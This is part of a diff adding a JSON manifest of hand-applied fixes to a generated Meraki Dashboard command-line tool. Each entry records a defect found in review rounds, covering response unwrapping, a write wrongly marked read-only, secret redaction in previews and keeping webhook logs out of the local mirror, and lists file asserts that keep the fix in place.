+     "contains": "func TestRound24URLScrubToEnd(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "var merakiBase64TokenPattern = regexp.MustCompile(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets_test.go",
+     "contains": "func TestBareHTTPServerIDWithheld(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "func merakiWithholdIfLeft(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets_test.go",
+     "contains": "func TestCodexRound21NestedEscapes(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "secret[k] = merakiSecretField(k, tv)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets_test.go",
+     "contains": "func TestLabelScrubDoesNotUnclassifyValues(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "s = merakiSignedURLPattern.ReplaceAllStringFunc(s, merakiRedactedHash)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets_test.go",
+     "contains": "func TestCodexRound23SignedLinksAndTokenLabels(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets.go",
+     "contains": "func merakiWithholdIfLeft(s string, urlParam bool) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_secrets_test.go",
+     "contains": "func TestRound26BackstopShapes(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meraki-response-path-keeps-object",
+   "summary": "applyResponsePath unwraps a response path only when the object holds nothing but that field and a meta block ({items, meta}); otherwise the whole object is printed; paged list reads (paginatedGetWithResponsePath, no --all) always unwrap their array",
+   "why": "Adversarial round 9 (2026-10-14): the generator inferred a response path from an object's only array field on ~59 typed GET commands, so `organizations action-batches get-organization-action-batch` printed only actions (dropping status.failed / errors, which fleet push tells the user to check), `organizations snmp get-organization` only peerIps, and `networks snmp get-network` only users, all exit 0, while the MCP execute twin returned the full object. The Dashboard API has no list envelope besides {items, meta}. TestApplyResponsePathKeepsMerakiObjects fails without the check (proven). Round 10 (2026-10-14): the first version also ran on paged list reads, where the response-path pager adds an internal __printing_press_response_path_items key, so ~100 paged list commands without --all printed the envelope (internal key included) instead of the list. Paged reads now always unwrap (unwrapResponsePath), and the sibling check ignores the internal key. TestPagedResponsePathStillUnwrapsTheList fails on the round-9 code (proven).",
+   "status": "active",
+   "spec_encode_followup": "Spec-encodable later: drop the inferred response path on object-shaped GET responses in the overlay.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "if merakiResponseHasSiblingFields(data, responsePath) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "func merakiResponseHasSiblingFields(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meraki_response_path_test.go",
+     "contains": "func TestApplyResponsePathKeepsMerakiObjects(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "return unwrapResponsePath(data, responsePath), nil",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meraki_response_path_test.go",
+     "contains": "func TestPagedResponsePathStillUnwrapsTheList(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meraki-vmx-claim-is-a-write",
+   "summary": "networks devices vmx-network-claim (POST /networks/{networkId}/devices/claim/vmx) goes through the client's write path and no longer carries mcp:read-only",
+   "why": "Adversarial round 9 (2026-10-14): the generator annotated this license-consuming POST mcp:read-only and sent it through PostQueryWithParams (the read path), which replays after an ambiguous failure and skips the verify-mode mutation gate: against a stub answering 502 it POSTed 4 times, and agent-context labelled it read-only. It was the only write so annotated. TestVmxClaimIsNotReplayed (1 POST after a 502, no read-only annotation) fails on the generated file (proven).",
+   "status": "active",
+   "spec_encode_followup": "Press retro: never classify a non-GET operation as read-only.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/networks_devices_vmx-network-claim.go",
+     "contains": "data, statusCode, err := c.PostWithParams(cmd.Context(), path, params, body)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/networks_devices_vmx-network-claim.go",
+     "not_contains": "\"mcp:read-only\": \"true\""
+    },
+    {
+     "file": "cli/internal/cli/meraki_vmx_claim_test.go",
+     "contains": "func TestVmxClaimIsNotReplayed(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meraki-search-auto-is-local",
+   "summary": "`search` reads the local mirror in the default auto mode and refuses --data-source live with a pointer to `fleet find`. The generated command called GET /organizations/{organizationId}/clients/search with the path parameter never filled, so every bare `search <query>` (the command's own help example) exited 5 before any request.",
+   "why": "Adversarial round 16 (2026-10-14): `search \"Bayside\"` exited 5 with 'unresolved path parameter {organizationId}' and never fell back to the mirror, while governance.md and page.json list `search` as the Allow-tier mirror read. Meraki has no account-wide search endpoint, so the live branch is removed. Proven against the factory fake: after `sync`, bare `search \"Bayside\"` returns the org and network rows with source local; `--data-source live` exits 2 with the fleet find hint. Round 17: `search --type organizations_networks` printed 'local store has not been synced yet' right after a sync because dependent resources record sync state per parent; search now checks for any sync. Round 18: with any sync counting, `search --type ssids` (a type sync never stores) returned [] with no hint; a typed search with zero results now says when the mirror holds no rows of that type.",
+   "status": "active",
+   "spec_encode_followup": "Press retro: the search template should not pick an endpoint whose path has unresolvable parameters.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/search.go",
+     "contains": "if flags.dataSource == \"live\" {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/search.go",
+     "contains": "reason = \"no_live_search\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/search.go",
+     "contains": "maybeEmitSyncHints(cmd, db, \"\", flags.maxAge)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/search.go",
+     "contains": "hint: the local store holds no %q rows",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meraki-writes-not-mirrored",
+   "summary": "writeMutationResponseToStore is a no-op: a write command never stores its response in the local mirror. A write reaches the mirror at the next sync, whose rows are keyed by real IDs (meraki-row-keys-not-display-names).",
+   "why": "Adversarial round 18 (2026-10-14): ~400 write commands stored their response. Meraki write responses are network-scoped objects keyed by a per-network number or a display name, so `networks wireless update-network-ssid N_1 0` and `... N_2 0` (both named Guest) blended into one row carrying N_1's psk field and N_2's settings, two VLAN 10s merged, and `networks webhooks update-network-payload-template` stored its headers array (x-functions-key and friends) where search, analytics and MCP sql (Allow tier) read them. Removing the write-through closes both the row-blending and the echo-a-credential class at once instead of chasing key names. TestWriteResponseIsNotMirrored runs an SSID update into an existing mirror with a sentinel in the plain name field and fails with the generated body restored (proven).",
+   "status": "active",
+   "spec_encode_followup": "Press retro: mutation write-through should be opt-in, and never key a row on a per-parent number or display name.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/data_source.go",
+     "not_contains": "items := mutationResponseEntityItems(storedType, data, responsePath)"
+    },
+    {
+     "file": "cli/internal/cli/data_source.go",
+     "contains": "pp:handfix meraki-writes-not-mirrored",
+     "min_count": 1,
+     "code_only": false
+    },
+    {
+     "file": "cli/internal/cli/meraki_writes_not_mirrored_test.go",
+     "contains": "func TestWriteResponseIsNotMirrored(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meraki-sync-skips-webhook-logs",
+   "summary": "The organizations_webhooks dependent (GET /organizations/{organizationId}/webhooks/logs) is removed from dependentResourceDefs, so sync never mirrors webhook delivery logs.",
+   "why": "Codex round 11 (2026-10-14): every delivery log row carries the receiver URL (Slack, Teams and PagerDuty URLs are credentials) in its data and its row ID, readable by search, analytics and MCP sql (Allow tier). The read stays available live and is listed in the Credential tier. Proven against the factory fake: after sync the request log has 0 webhooks/logs calls; TestSyncSkipsWebhookLogs fails with the generated entry restored (proven). A regeneration restores the entry, which the not_contains assert catches.",
+   "status": "active",
+   "spec_encode_followup": "Press retro: an x-pp-sync: false (or x-sensitive) marker on the operation.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "not_contains": "PathTemplate: \"/organizations/{organizationId}/webhooks/logs\""
+    },
+    {
+     "file": "cli/internal/cli/meraki_writes_not_mirrored_test.go",
+     "contains": "func TestSyncSkipsWebhookLogs(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meraki-mcp-bool-false",
+   "summary": "cliArgsFromMCP passes an explicit boolean false as --name=false instead of dropping it.",
+   "why": "Codex round 11 (2026-10-14): the MCP fleet_renewals tool with \"include-expired\": false still returned expired items, because the CLI flag defaults to true and a false was dropped; SKILL.md documented it as a limitation. The MCP read-only gate checks argument names, not values, so it is unchanged. TestMCPSendsExplicitFalse fails with the else branch removed (proven). Generated file (cobratree/shellout.go), so a reprint drops it.",
+   "status": "active",
+   "spec_encode_followup": "Press retro: cobratree shellout should pass explicit false for bool flags (fleet-wide).",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "out = append(out, \"--\"+k+\"=false\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/meraki_bool_false_test.go",
+     "contains": "func TestMCPSendsExplicitFalse(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meraki-gitleaks-low-entropy-fixtures",
+   "summary": "Test fixtures use low-entropy placeholder secrets: fleet_push_test.go's RADIUS secret is LIVE-XXXXXXXX, not a realistic token.",
+   "why": "CI runs gitleaks 8.18.4 (generic-api-key) over tracked files; the realistic fixture \"secret\":\"LIVE-RADIUS-7731\" tripped it (found by a local gitleaks 8.18.4 --no-git scan 2026-10-14). The test only asserts no LIVE- value reaches the preview, so the placeholder keeps its meaning. A re-vendor from the factory source would bring the realistic value back; this entry notices.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/fleet_push_test.go",
+     "not_contains": "LIVE-RADIUS-7731"
+    },
+    {
+     "file": "cli/internal/cli/fleet_push_test.go",
+     "contains": "\"secret\":\"LIVE-XXXXXXXX\"",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "meraki-log-occurrences",
+   "summary": "UpsertBatchDetailed suffixes '+#<n>' to the 2nd, 3rd, ... api_requests entry in one batch whose full request tuple (microsecond ts, admin, method, host, path, query, IP, user agent, response code, client, operation) repeats, so identical log entries stay separate rows.",
+   "why": "Codex round 17: a stub returning two identical API request entries stored one row and sync exited 0, undercounting repeated requests. api_requests has ReconcileMode none, so the suffix is never compared against seen IDs and is stable across syncs (same page, same order). Known ceiling: identical entries split across a page boundary still merge. Generated store.go code: a reprint drops it silently.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "occurrences := map[string]int{}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "id += \"+#\" + strconv.Itoa(n)",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meraki-fleet-push-desired-redacted",
+   "summary": "fleet push prints a redacted copy of --body as 'desired' (RedactMerakiObject on a deep copy, so a PSK, RADIUS secret or webhook URL in the body never reaches the Read-tier preview), while --apply sends the unredacted body (pushRow.body, json:\"-\"). Likewise the printed resource path, per-row errors and batch statuses pass through ScrubMerakiURLSecrets (a webhook HTTP server ID in --path is the receiver URL), while the action batch targets the real path (pushRow.path). Under a webhook path (store.MerakiWebhookPath, any encoding) row errors keep only the HTTP status and batch statuses only their state word: an API error body can echo the HTTP server ID JSON-escaped past any pattern scrub (Codex round 20). A --body key whose value redaction touched always reports as changed, so a preview cannot confirm a guessed PSK by showing no-change (adversarial round 25). --apply writes only real changes (pushRow.write from the unforced diff), so a matching secret is not re-sent (Codex round 22).",
+   "why": "Codex round 18: a --body file holding a PSK printed it under desired in the preview. Pinned both directions by TestFleetPushDesiredRedactedButAppliedWhole: the output never carries the PSK and the action batch does. Codex round 19: the preview printed the HTTP server ID in resource; pinned by TestFleetPushResourceScrubbedButTargetedWhole.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/fleet_push.go",
+     "contains": "store.RedactMerakiObject(desired, path)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_push_test.go",
+     "contains": "func TestFleetPushDesiredRedactedButAppliedWhole(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_push.go",
+     "contains": "Resource: store.ScrubMerakiURLSecrets(resource), path: resource,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_push.go",
+     "contains": "{\"resource\": r.path, \"operation\": \"update\", \"body\": r.body}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_push_test.go",
+     "contains": "func TestFleetPushResourceScrubbedButTargetedWhole(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_push.go",
+     "contains": "func pushErrText(path string, err error) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_push.go",
+     "contains": "func pushStatusText(path, status string) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_push_test.go",
+     "contains": "func TestFleetPushWebhookErrorsWithheld(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_push.go",
+     "contains": "if !reflect.DeepEqual(desired[k], body[k]) && !slices.Contains(changed, k) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_push_test.go",
+     "contains": "func TestFleetPushPreviewIsNotASecretOracle(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_push.go",
+     "contains": "if rows[i].Action == \"update\" && !rows[i].write {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "a credential such as the community string always shows as a change"
+    },
+    {
+     "file": "cli/internal/cli/fleet_push.go",
+     "contains": "PSK or community string, which always shows as update"
+    }
+   ]
+  },
+  {
+   "id": "meraki-fleet-find-ip-equality",
+   "summary": "fleet find canonicalizes an IP query (net.ParseIP().String()) and matches device, MX uplink and inventory IPs as parsed addresses (net.IP.Equal), not text.",
+   "why": "Codex round 24: '::ffff:192.0.2.1' found nothing for a device at 192.0.2.1, and a non-canonical IPv6 spelling on either side missed. Pinned by TestFleetFindMatchesIPAddressesNotText (mutation to text compare fails it).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/fleet_find.go",
+     "contains": "same := func(s string) bool { ip := net.ParseIP(s); return ip != nil && ip.Equal(want) }",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_find_test.go",
+     "contains": "func TestFleetFindMatchesIPAddressesNotText(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  }
+ ]
+}
